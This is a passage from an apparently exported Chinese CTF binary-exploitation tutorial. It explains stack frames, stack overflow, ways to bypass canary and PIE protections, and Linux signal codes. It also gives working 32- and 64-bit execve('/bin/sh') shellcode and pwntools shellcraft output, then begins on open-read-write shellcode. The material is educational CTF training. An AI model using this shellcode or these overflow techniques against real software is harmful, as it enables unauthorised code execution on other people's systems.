style=\"color:#444444;\">152.</font> | <font style=\"color:#444444;\">106.</font> | <font style=\"color:#444444;\">6A</font> | <font style=\"color:#444444;\">j</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1101011.</font> | <font style=\"color:#444444;\">153.</font> | <font style=\"color:#444444;\">107.</font> | <font style=\"color:#444444;\">6B</font> | <font style=\"color:#444444;\">k</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1101100.</font> | <font style=\"color:#444444;\">154.</font> | <font style=\"color:#444444;\">108.</font> | <font style=\"color:#444444;\">6C</font> | <font style=\"color:#444444;\">l</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1101101.</font> | <font style=\"color:#444444;\">155.</font> | <font style=\"color:#444444;\">109.</font> | <font style=\"color:#444444;\">6D</font> | <font style=\"color:#444444;\">m</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1101110.</font> | <font style=\"color:#444444;\">156.</font> | <font style=\"color:#444444;\">110.</font> | <font style=\"color:#444444;\">6E</font> | <font style=\"color:#444444;\">n</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1101111.</font> | <font style=\"color:#444444;\">157.</font> | <font style=\"color:#444444;\">111.</font> | <font style=\"color:#444444;\">6F</font> | <font style=\"color:#444444;\">o</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1110000.</font> | <font style=\"color:#444444;\">160.</font> | <font style=\"color:#444444;\">112.</font> | <font style=\"color:#444444;\">70.</font> | <font style=\"color:#444444;\">p</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1110001.</font> | <font style=\"color:#444444;\">161.</font> | <font style=\"color:#444444;\">113.</font> | <font style=\"color:#444444;\">71.</font> | <font style=\"color:#444444;\">q</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1110010.</font> | <font style=\"color:#444444;\">162.</font> | <font style=\"color:#444444;\">114.</font> | <font style=\"color:#444444;\">72.</font> | <font style=\"color:#444444;\">r</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1110011.</font> | <font style=\"color:#444444;\">163.</font> | <font style=\"color:#444444;\">115.</font> | <font style=\"color:#444444;\">73.</font> | <font style=\"color:#444444;\">s</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1110100.</font> | <font style=\"color:#444444;\">164.</font> | <font style=\"color:#444444;\">116.</font> | <font style=\"color:#444444;\">74.</font> | <font style=\"color:#444444;\">t</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1110101.</font> | <font style=\"color:#444444;\">165.</font> | <font style=\"color:#444444;\">117.</font> | <font style=\"color:#444444;\">75.</font> | <font style=\"color:#444444;\">u</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1110110.</font> | <font style=\"color:#444444;\">166.</font> | <font style=\"color:#444444;\">118.</font> | <font style=\"color:#444444;\">76.</font> | <font style=\"color:#444444;\">v</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1110111.</font> | <font style=\"color:#444444;\">167.</font> | <font style=\"color:#444444;\">119.</font> | <font style=\"color:#444444;\">77.</font> | <font style=\"color:#444444;\">w</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1111000.</font> | <font style=\"color:#444444;\">170.</font> | <font style=\"color:#444444;\">120.</font> | <font style=\"color:#444444;\">78.</font> | <font style=\"color:#444444;\">x</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1111001.</font> | <font style=\"color:#444444;\">171.</font> | <font style=\"color:#444444;\">121.</font> | <font style=\"color:#444444;\">79.</font> | <font style=\"color:#444444;\">y</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1111010.</font> | <font style=\"color:#444444;\">172.</font> | <font style=\"color:#444444;\">122.</font> | <font style=\"color:#444444;\">7A</font> | <font style=\"color:#444444;\">z</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1111011.</font> | <font style=\"color:#444444;\">173.</font> | <font style=\"color:#444444;\">123.</font> | <font style=\"color:#444444;\">7B</font> | <font style=\"color:#444444;\">{</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1111100.</font> | <font style=\"color:#444444;\">174.</font> | <font style=\"color:#444444;\">124.</font> | <font style=\"color:#444444;\">7C</font> | <font style=\"color:#444444;\">|</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1111101.</font> | <font style=\"color:#444444;\">175.</font> | <font style=\"color:#444444;\">125.</font> | <font style=\"color:#444444;\">7D</font> | <font style=\"color:#444444;\">}</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1111110.</font> | <font style=\"color:#444444;\">176.</font> | <font style=\"color:#444444;\">126.</font> | <font style=\"color:#444444;\">7E</font> | <font style=\"color:#444444;\">~</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1111111.</font> | <font style=\"color:#444444;\">177.</font> | <font style=\"color:#444444;\">127.</font> | <font style=\"color:#444444;\">7F</font> | <font style=\"color:#444444;\">DEL (Delete)</font> | <font style=\"color:#444444;\">删除</font> |\n\n\n","tags":["PWN攻略-所需表格","计算机原理相关表格"],"categories":["PWN不出来"]},{"title":"02 栈溢出介绍及初级栈溢出","url":"//docx/02 栈溢出介绍及初级栈溢出/","content":"# 栈溢出基础\n## C语言函数调用栈\n### 函数调用栈\n函数调用栈是指程序运行时侯，内存的一段连续的区域。用来保护函数运行时候的状态信息（函数参数，局部变量等）。\n\n称之为“栈”的原因是因为发生函数调用时，调用函数_（caller）_的状态被保存在栈内，被调用函数（callee）的状态压入调用栈的栈顶。\n\n在函数调用结束的时候，栈顶的被调用函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。\n\n调用函数栈在内存中从高地址向低地址生长，所以栈顶对应内存地址在压栈时变小，退栈时候变大。\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_0.png)\n\n比如下面这个代码：\n\n```c\n#include<stdio.h>\n\nint main(){\n    chat str[]=\"hello,world\";\n    printf(\"%s\",str);\n    return 0;\n}\n```\n\n其中，str被保存在`main`的函数栈区中，当我调用`printf`的时候，str便会放入到printf函数的栈区中。此时printf就是被调用函数callee，而caller就是调用函数main。\n\n### 栈帧结构\n就像我上面说的，每次使用某个函数的时候就会创造相对于的“调用函数的状态”或者“被调用函数的状态”。而这个栈的结构是怎么样的呢：\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_1.png)\n\n简单介绍一下，这边我们的从_局部变量(Local variables)_到_栈帧指针(stack frame pointer)_的范围内都是我们的被调用寄存器，而返回地址上面（向高地址）的参数则是前一个函数的参数，在前面是上一个函数的栈帧指针。所以一般而言，我们只要看_局部变量(Local variables)_到_栈帧指针(stack frame pointer)_的范围就行了。\n\n然后这张图是完全按照高地址到低地址（上到下）来呈现的。\n\n### 函数状态寄存器\n要表示一个函数此时此刻栈帧中的状态，主要涉及到三个寄存器：esp，ebp和eip。（在64位架构下这些指针应该叫做rsp,rbp和rip)（下边大部分时候都拿32位的称呼去做操作演示）\n\n**EIP RIP：**全称叫做_指令指针（Instruction Pointer, IP）_，它用于存储吓一跳将被执行的指令在代码段中的偏移地址。CPU通过EIP寄存器来确定从内存中的哪一个位置来读取下一条指令。当我运行printf(\"Helloworld\")的时候，eip会先指向指令`mov rdi, [Helloworld字符串地址]`，然后再指向`call printf`这个指令。这两条指令构成了在某一函数内输出Helloworld的方式。\n\n**ESP RSP：**全称叫做_栈指针（Extended Stack Pointer，SP，又叫做栈顶指针）_，栈遵循先进后出原则。ESP指针一般指向栈顶，当有值被压入栈的时候，栈顶指针就会根据被压入栈中参数的长短做偏移形成存有新值的ESP指针。简而言之，不管栈如何变化，ESP寄存器一般而言都会存有当前栈顶地址的状态。\n\nEBP RBP：全称叫做_基址指针（Base Pointer，BP，又叫做栈底指针），_当栈被创建的时候，EBP就指向栈的最低端，此时`EBP==ESP`，随后当栈发生变化（有数据压入或者弹出），ESP在变化的时候，EBP还是存有栈底的地址，不会变化。简而言之，不管栈如何变化，EBP寄存器一般而言都会存有当前函数栈底地址的状态。\n\n### 函数栈形成与状态\n首先将被调用函数callee的参数按照逆序依次压入栈内。如果callee不需要参数，则没有这一步骤。这些参数仍会保存在caller的函数状态内。之后压入栈内的数据就会作为callee的函数状态保存，如下图所示：\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_2.png)\n\n**将被调用函数(Callee)的参数压入栈中1**\n\n然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入返回地址压入栈内。这样caller的eip信息就得以保存了，如下图所示：\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_3.png)\n\n**将被调用函数(Callee)的参数压入栈中2**\n\n再将当前的ebp寄存器的值（也就是caller的基地址）压入栈内，并将ebp寄存器的值更新位当前栈顶的地址。这样调用函数caller的ebp信息得以保存，同时，ebp被更新为callee的基地址，如下图所示：\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_4.png)\n\n**将caller的ebp压入栈内，并将当前栈顶地址传入ebp中**\n\n在压栈的过程中，esp的寄存器的值不断变小（对应栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的及地址、局部变量这些参数的状态。其中调用参数以外的数据共同构成了被调用函数callee的状态。\n\n在发生调用时候，程序还会将callee的指令地址存到eip寄存器内，这样程序就可以依次执行callee的指令了。\n\n最后将被调用函数(callee)的局部变量压入栈内，如下图所示：\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_5.png)\n\n**将caller的ebp压入栈内，并将当前栈顶地址传入ebp中**\n\n看过了函数调用发生时的情况，就不难理解函数调用结束时候的变化。变化的和性就是丢弃callee的状态，将栈顶恢复成caller的状态。首先callee的局部变量会先从栈内直接弹出，栈顶会指向callee的基地址。\n\n然后将基地址的内储存调用函数caller的基地址从栈内弹出，并且存到ebp寄存器中，这样caller的ebp信息得以恢复。此时栈顶会指向返回地址。\n\n最后将返回地址pop到eip中，随后esp再向上一格，回到caller的栈顶位置，ebp保持不变。如下图所示：\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_6.png)\n\n## 栈溢出（stack overflow）\n### 栈溢出原理\n讲完上面的基础知识，我们可以理解：当函数正在执行内部指令的过程中，我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用的时候，程序的控制权会在函数状态之间发生跳转，这时我们可以通过修改函数状态（修改返回地址）来实现攻击。而控制程序执行指令最关键的寄存器就是eip，所以我们的目标就是让rip载入攻击指令的地址。 \n\n:::info\n**缓冲区溢出（Buffer overflow）**\n\n编写程序的时候没有考虑到或者错误的控制用户输入的长度，本质就是向<font style=\"color:#DF2A3F;\">定长的缓冲区</font>中写入了<font style=\"color:#DF2A3F;\">超长的数据</font>，造成超出的数据覆写了合法内存区域。\n\n_**<font style=\"color:#DF2A3F;\">栈溢出（Stack overflow）</font>**_：最常见、漏洞比例最高、危害最大的二进制漏洞。在CTF PWN中往往是漏洞利用的基础。\n\n_**堆溢出（Heap overflow）**_：关系到堆管理器系统，比较复杂，利用花样多。CTF PWN中的常见题型\n\n_**Data段溢出**_：比如.bss段，修改关键变量，比较少见。攻击效果依赖于Data段上存放了何种控制数据。\n\n:::\n\n### 栈溢出的基本利用\n如果说有这么一个函数（32位）：\n\n```c\nint overflow(){\n    char buf[8];\n    read(0, buf, 16);\n    return 0;\n}\n```\n\n当我调用这个函数的时候，函数将初始化esp和ebp寄存器，且将eip指针指向这个代码中。而下面这张图的左边就是overflow的栈帧视图，右边则为我输入`AAAABBBBCCCCDDDD`之后栈帧中实际的值存储情况。\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_7.png)\n\n我们会发现当我们输入这么多东西之后，return address就被篡改成了'DDDD'所表示的地址，也就是0x44444444。而此时此刻也会出现一个问题：那就程序中没有0x44444444这个地址。\n\n所以如果我们一旦把`DDDD`这一块的内容改成某个具体的地址化，实际上就会跳转到这个地址，并且运行这个地址里面的内容了。也就是——篡改栈帧上的返回地址，为程序中已有的函数。\n\n学完上面的内容，我们可以配合一套例题来食用：[overflow_ez_32](/docx/overflow_ez_32/)\n\n# Canary_pie绕过\n## canary机制\n### canary原理\ncanary是一个用来**防护栈溢出**的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个四字节或者八字节（取决于系统架构是32还是64）的值存到栈上去。<font style=\"color:#DF2A3F;\">当函数结束时会检查这个栈上的值是否和一开始存进去的值一样。</font>程序每次运行的时候，canary的值都会不一样。对于我们而言，canary的值几乎是一个随机值。我们无法知道值是多少。\n\n像我们上面举例的例子，再有canary的情况下就会变成这样：\n\n![画板](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_8.png)\n\n\t如果像这样，我们将Canary篡改之后，就会触发`__Stack_chk_fail`这个函数，并且会报错。\n\n不过就像上面所说，如果我们知道canary的值是多少，那么我们便可以在栈溢出的时候保留canary的值，且就可以成功溢出了。\n\n:::info\n说起来我也是无聊，当时学canary的时候，很好奇这个翻译过来叫做“金丝雀”的东西为什么会是一种保护机制。\n\n这个名字非常有趣，他和我们的近代工业史有关——19世纪时候的煤矿工人下井挖矿的时候，会带着一只金丝雀。矿井里面会有一些无色无味的有毒气体，像是一氧化碳，人类要吸入一定剂量才会出现问题，而且那个时候已经逃不掉了。不过金丝雀这种小动物容易出现明显反应。矿工们通过观察金丝雀的状态，就能提前察觉危险，及时撤离。\n\n还有一种说法是（我觉得两种都有），矿工下矿前会把金丝雀先拿绳子下放到矿井中，过一会儿再拿上来查看反应。这个就很像栈溢出的时候canary先放入栈中试探，等到函数运行结束的时候再拿上来对比值一样了。\n\ncanary保护顾名思义，和金丝雀一样脆弱。每当一次canary绕过失败的时候，你可以理解为计算机里面死了一只电子金丝雀（难崩）。\n\n:::\n\n### canary绕过方法\n如此，其实绕过canary的最重要的一步就是如何获取canary的值，canary绕过大概有以下几种绕过方式：\n\n**1、格式化字符串绕过canary：**通过格式化字符串读取canary的值\n\n**2、canary爆破（针对有fork的程序）：**我在[pwn及计算机原理基础知识](/docx/pwn%E5%8F%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/)这里说明了fork函数的具体作用。fork函数相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary的值也是一样的。所以可以通过这个机制堆canary逐位爆破，如果程序崩溃了就说明这一位不对。如果程序可以正常那就接着跑下一位，直到跑出正确的canary。\n\n**3、Stack samashing（故意触发**`**canary_spp leak**`**）**\n\n**4、劫持__stack_chk_fail：**修改got表中`__stack_chk_fail`函数的地址，在栈溢出后执行该函数，不过因为我们修改了`__stack_chk_fail`函数所指向的地址，程序运行`__stack_chk_fail`的时候就会跳转到我们当时修改的地址。\n\n#### 格式化字符串绕过canary\n（我懒得画图了，这一块我就用Excel来画图演示，会比较方便）\n\n有关格式化字符串的介绍可以去看暗线中的：[01 格式化字符串](/docx/01%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/)，稍微学一点即可，现在全学完学不明白。\n\n假设有一个%s这样的格式化字符串，如果我们把输入的内容和canary连在一起，那么在用%s这种格式化字符串输出的时候就会将canary一起打印出来。\n\n需要注意的是，canary的最后一位一定是'\\0'，用于放置连带输出，所以我们改的时候，要把canary的最后一位也改了（其实理解成“最前面一位是'\\0'”会比较合适，因为这里的，所谓“最后一位”实际上是小端序）。\n\n![](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_9.png)\n\n例题：\n\n## PIE机制原理\nPIE技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护，那么在每次加载程序时都会变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。\n\n在一个开启PIE保护的程序中，所有代码段的地址都只有最后三个数字是已知的：\n\n![](/img/filesimg/02%20栈溢出介绍及初级栈溢出/02%20栈溢出介绍及初级栈溢出_10.png)\n\n这些数字分别是这一行数据相对于基地址的偏移量。\n\n还有一点需要强调的是，程序的加载地址一般都是以内存页为单位的，所以程序的基地址的最后三个数字一定是0，也就是说我们看到的这些所谓的**“偏移量”就是内存中实际地址的最后三位数**。\n\n所以，虽然我不知道完整的地址，但我知道最后的三个数，那么我就可以利用栈上已有的地址，只修改他们的最后两个字节（最后四位数）即可。\n\n所以对于绕过PIE保护的核心思想就是**<font style=\"color:#DF2A3F;\">partial writing（部分地址改写）</font>**\n\n例题：\n\n所以这种方法，从某种意义上按照道理每次爆破都只有1/16的概率能进。\n\n还有泄露基地址。\n\n","tags":["PWN攻略-主线","shellcode"],"categories":["PWN不出来"]},{"title":"Linux退出状态码","url":"//docx/Linux退出状态码/","content":"| 信号编号 | 信号名称 | 信号描述 | 默认处理方式 | Exit code |\n| :--- | :--- | :--- | :--- | :--- |\n| 1. | SIGHUP | 挂起 | 终止 | 1. |\n| 2. | SIGINT | 终端中断 | 终止 | 2. |\n| 3. | SIGQUIT | 终端退出 | 终止、core dump | 131. |\n| 4. | SIGILL | 非法指令 | 终止、core dump | 132. |\n| 5. | SIGTRAP | 跟踪 / 断点陷阱 | 终止、core dump | 133. |\n| 6. | SIGABRT | 终止进程 | 终止、core dump | 134. |\n| 7. | SIGBUS | Bus error | 终止、core dump | 135. |\n| 8. | SIGFPE | 算术异常 | 终止、core dump | 136. |\n| 9. | SIGKILL | 杀死进程（必杀） | 终止 | 9. |\n| 10. | SIGUSR1 | 用户自定义信号 1 | 终止 | 10. |\n| 11. | SIGSEGV | 段错误 | 终止、core dump | 139. |\n| 12. | SIGUSR2 | 用户自定义信号 2 | 终止 | 12. |\n| 13. | SIGPIPE | 管道断开 | 终止 | 13. |\n| 14. | SIGALRM | 定时器信号 | 终止 | 14. |\n| 15. | SIGTERM | 终止进程 | 终止 | 15. |\n| 16. | SIGSTKFLT | 栈错误 | 终止 | 16. |\n| 17. | SIGCHLD | 子进程退出 | 忽略 | 无 |\n| 18. | SIGCONT | 继续执行 | 若停止则继续执行 | 无 |\n| 19. | SIGSTOP | 停止执行（必停） | 暂停执行 | 无 |\n| 20. | SIGTSTP | 停止 | 暂停执行 | 无 |\n| 21. | SIGTTIN | Stopped (tty input) | 暂停执行 | 无 |\n| 22. | SIGTTOU | Stopped (tty output) | 暂停执行 | 无 |\n| 23. | SIGURG | IO 紧急数据 | 忽略 | 无 |\n| 24. | SIGXCPU | 突破对 cpu 时间的限制 | 终止、core dump | 152. |\n| 25. | SIGXFSZ | 突破对文件大小的限制 | 终止、core dump | 153. |\n| 26. | SIGVTALRM | 虚拟定时器超时 | 终止 | 26. |\n| 27. | SIGPROF | 性能分析定时器超时 | 终止 | 27. |\n| 28. | SIGWINCH | 终端窗口尺寸发生变化 | 忽略 | 无 |\n| 29. | SIGIO | IO 时可能产生 | 终止 | 29. |\n| 30. | SIGPWR | 电量行将耗尽 | 终止 | 30. |\n| 31. | SIGSYS | 错误的系统调用 | 终止、core dump | 159. |\n| 34~64 | SIGRTMIN~SIGRTMAX | 实时信号 | | |\n\n\n","tags":["PWN攻略-所需表格","计算机原理相关表格"],"categories":["PWN不出来"]},{"title":"01 ShellCode","url":"//docx/01 ShellCode/","content":" \n# 什么是shellcode\nshellcode通常是软件漏洞利用过程中使用的一小段机器代码\n\n作用：\n\n**1、启动shell进行交互**\n\n2、打开服务器端口等待连接\n\n3、反向连接端口\n\n4、。。。。\n\n# shellcode编写\n我们在linux系统写编写一个最简短的c语言程序：\n\n```c\n//gcc -m32 -o shell shell.c\n#include<stdlib.h>\n#include<unistd.h>\n\nvoid main(){\n    system(\"/bin/sh\");\n    exit(0);\n}\n```\n\n很显然，这样做出来的程序太大了，在题目中我们一般只能输入几十个字节，其次他直接使用了系统函数，但是我们都不知道系统函数是啥（被包装成`sytem@plt`了）：\n\n![](/img/filesimg/01%20ShellCode/01%20ShellCode_0.png)\n\n![](/img/filesimg/01%20ShellCode/01%20ShellCode_1.png)\n\n我们可以通过中断的方法进行系统调用。\n\n## 系统中断方法调用shellcode\n触发中断（int 0x80或者syscall），进行系统调用\n\nsystem(\"/bin/sh\")底层调用的是execve(\"/bin/sh\",0,0)\n\n我们可以看execve函数分别对应的调用：\n\n| 64位 | | | | | | | | |\n| --- | --- | --- | --- | --- | --- | --- | --- | --- |\n| **NR** | **System call** | **%rax** | **%rdi（arg0）** | **%rsi（arg1）** | **%rdx（arg2）** | **%r10（arg3）** | **%r8（arg4）** | **%r9（arg5）** |\n| 59 | sys_execve | 0x3b | const char *filename | const char *const argv[] | const char* const envp[] |  |  |  |\n| 32位 | | | | | | | | |\n| **NR** | **System call** | **%eax** | **%ebx（arg0）** | **%ecx（arg1）** | **%edx（arg2）** | **%esi（arg3）** | **%edi（arg4）** | **%ebp（arg5）** |\n| 11 | sys_execve | 0x0b | const char *filename | const char *const argv[] | const char* const envp[] |  |  |  |\n\n\n其中在syscall中，每一个寄存器都会有各自的参数作用，最后的`int 0x80`就是linux系统调用的中断，也就是使用这个终端，就会触发syscall（系统调用）\n\n#### 32位shellcode\n因为execve(\"/bin/sh\",0,0)如表格所示，所以我可以写一个不需要callsys也可以直接进入shell的shellcode，具体如下：\n\n```plain\n;;nasm -f elf32 shellcode32.asm\n;;ld -m elf_i386 -o shellcode32 shellcode32.o\n;;objdump -d shellcode32\nglobal _start\n_start:\n    push \"/sh\"\n    push \"/bin\"\n    mov ebx, esp\n    xor ecx, ecx\n    xor edx, edx\n    mov eax, 0x0b\n    int 0x80\n```\n\n现在，我们得到一个非常小的shellcode，并且也没有使用系统函数。\n\n![](/img/filesimg/01%20ShellCode/01%20ShellCode_2.png)![](/img/filesimg/01%20ShellCode/01%20ShellCode_3.png)\n\n因为是i386，也就是32位的程序，很显然我们可以看到这里对应32位的syscall各自的参数是如表格所示的。\n\n#### 64位shellcode\n如此这般，我们可以构造一个64位的shellcode：\n\n```plain\n;;nasm -f elf64 shellcode64.asm\n;;ld -m elf_x86_64 -o shellcode64 shellcode64.o\n;;objdump -d shellcode64\nglobal _start\n_start:\n    mov rbx, '/bin/sh'     ; 把字符串\"/bin/sh\"的地址放到rbx寄存器\n    push rbx               ; 将\"/bin/sh\"的地址压入栈\n    push rsp               ; 把当前栈顶指针（指向\"/bin/sh\"地址）压入栈\n    pop rdi                ; 从栈弹出数据到rdi，使rdi指向\"/bin/sh\"\n    xor rsi, rsi           ; 清空rsi（argv参数设为0）\n    xor rdx, rdx           ; 清空rdx（envp参数设为0）\n    push 0x3b              ; 把系统调用号0x3b压入栈\n    pop rax                ; 从栈弹出数据到rax，设置系统调用号\n    syscall                ; 执行系统调用\n```\n\n在64位里面，相比于32位，首先是传参寄存器的名字有所更改，其中`int 0x80`变成了`syscall`。\n\n 其中我们要记得一些常用的蠢货十六进制数，用于到时候用来查看或者学习：\n\n| 十六进制数 | 含义 | 用法 |\n| --- | --- | --- |\n| 0x68732f2f  | //sh | ```plain mov ebx, 0x68732f2f    ; 存储 \"//sh\"（双斜杠是为了对齐） push rbx               ; 压入 \"//sh\" ```  |\n| 0x6e69622f | /bin | ```plain mov ebx, 0x6e69622f    ; 存储 \"/bin\" push rbx               ; 压入 \"/bin\" ```  |\n| 0x0068732f6e69622f | /bin/sh |  |\n\n\n这边是用于对齐1byte，也就是8位，所以四个字符四个字符的输入（一个字符一byte，一个byte两个十六进制数，四个byte8个十六进制数）\n\n如此这般，我的64位shellcode也可以写成：\n\n```plain\n;;nasm -f elf64 shellcode64_nostr.asm\n;;ld -m elf_x86_64 -o shellcode64_nostr shellcode64_nostr.o\n;;objdump -d shellcode64_nostr\nglobal _start\n_start:\n    mov rbx, 0x0068732f6e69622f ;其中00是\\0的意思\n    push rbx\n    push rsp\n    pop rdi\n    xor rsi, rsi\n    xor rdx, rdx\n    push 0x3b\n    pop rax\n    syscall\n```\n\n很显然，我们现在倒是理解了这个最基础的内容，那么我们直接放到pwn里面岂不是还要当场构造汇编嘛？\n\n完全不用，我们只需要熟悉pwntools就可以快速生成对应架构的shellcode了。\n\n## 使用pwntool快速生成shellcode\n使用pwntools快速生成对应架构的shellcode，总共两步：\n\n1、设置架构目标 2、生成shellcode\n\n### #32位\n```python\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\nshellcode = asm(shellcraft.sh())\n```\n\n其中他的shellcode如下：\n\n```plain\n.section .shellcode,\"awx\"\n.global _start\n.global __start\n_start:\n__start:\n.intel_syntax noprefix\n.p2align 0\n    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n    /* push b'/bin///sh\\x00' */\n    push 0x68\n    push 0x732f2f2f\n    push 0x6e69622f\n    mov ebx, esp\n    /* push argument array ['sh\\x00'] */\n    /* push 'sh\\x00\\x00' */\n    push 0x1010101\n    xor dword ptr [esp], 0x1016972\n    xor ecx, ecx\n    push ecx /* null terminate */\n    push 4\n    pop ecx\n    add ecx, esp\n    push ecx /* 'sh\\x00' */\n    mov ecx, esp\n    xor edx, edx\n    /* call execve() */\n    push 11 /* 0xb */\n    pop eax\n    int 0x80\n```\n\n### #64位\n```python\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\nshellcode = asm(shellcraft.sh())\n```\n\n其中它的shellcode如下：\n\n```plain\n.section .shellcode,\"awx\"\n.global _start\n.global __start\n_start:\n__start:\n.intel_syntax noprefix\n.p2align 0\n    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n    /* push b'/bin///sh\\x00' */\n    push 0x68\n    mov rax, 0x732f2f2f6e69622f\n    push rax\n    mov rdi, rsp\n    /* push argument array ['sh\\x00'] */\n    /* push b'sh\\x00' */\n    push 0x1010101 ^ 0x6873\n    xor dword ptr [rsp], 0x1010101\n    xor esi, esi /* 0 */\n    push rsi /* null terminate */\n    push 8\n    pop rsi\n    add rsi, rsp\n    push rsi /* 'sh\\x00' */\n    mov rsi, rsp\n    xor edx, edx /* 0 */\n    /* call execve() */\n    push 59 /* 0x3b */\n    pop rax\n    syscall\n```\n\n这些方法生成的shellcode非常有用，在与他把0x00（也就是\\0)（或者64位补0）的情况给消灭了。不会出一些奇怪的bug。\n\n## 普通shellcode\n了解完上面的东西之后，我们可以学一下这道题目：\n\n**64位经典shellcode：**[mrctf2020_shellcode](/docx/mrctf2020_shellcode/)\n\n这道题目就是一个典型的64位系统的shellcode，输入完shellcode之后就可以直接进入终端。然后这里还有一个32位的\n\n**32位经典shellcode：[ciscn_2019_s_9](/docx/%2A%2Aciscn_2019_s_9%2A%2A/)**\n\n## ORW\n有一种比较特殊的shellcode，就是这样的：[shellcode1_dahuan02](/docx/shellcode1_dahuan02/)\n\n这道题目是ORW，所谓ORW就是Open、Read、Write。\n\n因为几乎所有的程序都需要打开文件，读取数据和输出。而有些题目会封锁systemcall里面的sys_execve。按照这个逻辑，我们可以通过ORW来读取所有我们需要的文件，如下：\n\n![](/img/filesimg/01%20ShellCode/01%20ShellCode_4.png)\n\n这是一个非常基本的64位流程图，因为这些题目都会有一个特性：执行用户输入进去的内容。\n\n然后在这里我们详细讲一下ORW的残割参数和里面是如何传递输出的。\n\n首先我们先要学习一下这三个函数：\n\n就拿32位的举例：\n\n| **Num** | **syscall** | **%eax** | **arg0 (%ebx)** | **arg1 (%ecx)** | **arg2 (%edx)** |\n| --- | --- | --- | --- | --- | --- |\n| 3 | read | 0x03 | unsigned int fd | char *buf | size_t count |\n| 4 | write | 0x04 | unsigned int fd | const char *buf | size_t count |\n| 5 | open | 0x05 | const char *filename | int flags | umode_t mode |\n\n\neax是调用这个syscall所需要的值，就像是sys_execve的里面的0x0b一样，是调用号。再然后，我们来讲这三个函数，先是open函数。\n\n### open函数\n我们首先使用open函数打开文件，第一参数位文件名，第二参数为打开模式，第三参数为打开权限\n\n其中**第一参数**文件名就不多赘述了，打开模式必选**第二参数**，大概如下：\n\nO_RDONLY：只读模式（值为 0）。\n\nO_WRONLY：只写模式（值为 1）。\n\nO_RDWR：读写模式（值为 2）。\n\n```c\n// 只读打开，若文件不存在则报错\nopen(\"file.txt\", O_RDONLY);//read only的常数值为0\n\n// 读写打开，若文件不存在则创建，权限为 0644（需第三参数）\nopen(\"file.txt\", O_RDWR | O_CREAT, 777);//读写模式的常数值为2\n\n// 只写打开，若文件存在则清空，不存在则创建\nopen(\"file.txt\", O_WRONLY | O_CREAT | O_TRUNC, 777);\n\n// 追加模式打开，若文件不存在则创建\nopen(\"log.txt\", O_WRONLY | O_CREAT | O_APPEND, 777);\n```\n\n**第三参数**为打开权限，一般不用填写。\n\n随后open会返回一个返回符号fd。\n\n### read函数\n当我们使用完open之后，会得到一个返回值存储在eax里面，这个返回值一般被叫做_fd（文件调用符）_，fd的值会从0开始，作为一个等差数组一个一个往上加，例如0,1,2,3,4这样。\n\n其中，每个程序一开始会自我定义三个fd，分别如下：\n\n| **文件描述符** | **名称** | **含义** | **通常关联的设备** |\n| :--- | :--- | :--- | :--- |\n| 0 | `STDIN_FILENO` | 标准输入 | 键盘 |\n| 1 | `STDOUT_FILENO` | 标准输出 | 终端屏幕 